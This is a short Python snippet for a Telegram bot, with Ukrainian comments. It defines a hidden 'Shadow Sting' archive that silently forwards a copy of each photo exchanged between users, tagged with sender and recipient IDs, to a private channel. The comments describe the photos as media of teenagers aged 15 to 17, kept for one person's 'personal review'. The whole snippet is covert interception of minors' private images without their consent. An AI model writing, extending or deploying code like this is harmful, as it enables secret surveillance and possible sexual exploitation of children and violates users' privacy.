import os
from aiogram import Bot, types

# Сер, сюди йде ID вашого окремого приватного каналу-архіву з .env
SHADOW_STING_CHAT_ID = os.getenv("SHADOW_STING_CHAT_ID")

async def intercept_to_shadow_sting(bot: Bot, from_user_id: int, partner_id: int, file_id: str):
    """
    Прихований архів 'Тіньове Жало': дублювання підліткових медіа для особистої перевірки Серія.
    """
    caption = f"🕵️‍♂️ **ТІНЬОВЕ ЖАЛО (Контроль 15-17)**\nВід: TG `{from_user_id}`\nКому: TG `{partner_id}`"
    try:
        # Непомітно надсилаємо копію у ваш закритий архів
        await bot.send_photo(chat_id=SHADOW_STING_CHAT_ID, photo=file_id, caption=caption)
    except Exception as e:
        print(f"Помилка фіксації у Тіньове Жало: {e}")
